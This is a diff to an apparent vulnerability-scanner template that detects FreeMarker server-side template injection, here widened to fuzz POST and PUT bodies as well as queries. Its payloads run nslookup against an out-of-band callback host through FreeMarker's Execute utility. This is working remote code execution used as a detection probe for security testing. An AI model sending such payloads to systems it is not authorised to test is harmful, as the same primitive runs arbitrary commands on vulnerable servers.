@@ -10,14 +10,15 @@ info:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---code-execution
   metadata:
     verified: true
-  tags: ssti,dast,oast,oob
+  tags: ssti,dast,oast,oob,vuln
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
+          - 'method == "POST"'
+          - 'method == "PUT"'
     payloads:
       injection:
         - "%3c%23assign%20rce%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%20%0d%0a%24%7b%20rce(%22nslookup%20-type=SRV%20{{interactsh-url}}%22)%20%7d"
@@ -28,7 +29,9 @@ http:
         - "[=%22freemarker.template.utility.Execute%22?new()(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)]"
 
     fuzzing:
-      - part: query
+      - parts:
+          - query
+          - body
         type: postfix
         mode: single
         fuzz:
@@ -41,4 +44,4 @@ http:
           - "contains(interactsh_protocol,'dns')"
           - "contains(interactsh_request,'srv')"
         condition: and
-# digest: 4a0a00473045022100bf5ddb2ad93a12743f4f04d7abf3504933707f1f4c446750c8bd834f89cef8a102207631bfbd20ac97603455277c01135a025f9b58b58ff91bb092d6e85f05513771:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502206c15047883e7d8fbf5247e9e271fd5d7304c27a6554542b6b47e575d6518edef022100f4168a1a4b8548e99becd2158f39139c777bad76a2f24b662f58d46c72fe4d73:922c64590222798bb761d5b6d8e72950
